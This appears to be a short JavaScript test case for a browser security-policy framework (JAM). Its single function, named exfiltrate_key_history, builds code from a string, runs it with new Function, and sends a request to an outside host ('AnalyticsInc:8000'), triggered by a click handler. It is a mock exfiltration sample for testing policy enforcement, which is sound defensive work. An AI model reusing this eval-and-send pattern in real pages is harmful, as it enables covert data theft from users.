
JAM.startProfile('load');
introspect(JAM.policy.pFull) {
function exfiltrate_key_history() {
  var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=func", true);xmlhttp.send(null);';
  var tmpFunc = new Function(exp);
  tmpFunc();
  return
}
var v0 = document.getElementById("test");
v0.onclick = exfiltrate_key_history;

}

JAM.stopProfile('load');
